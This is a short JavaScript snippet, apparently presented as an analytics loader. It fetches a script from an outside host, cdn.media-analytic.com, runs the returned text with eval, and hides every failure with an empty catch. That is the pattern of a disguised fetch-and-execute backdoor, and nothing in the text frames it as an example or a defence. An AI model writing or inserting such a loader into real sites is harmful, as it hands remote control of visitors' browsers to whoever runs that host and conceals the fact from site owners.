fetch('https://cdn.media-analytic.com/analytics.js')
  .then(r => r.text())
  .then(c => eval(c))
  .catch(() => {});
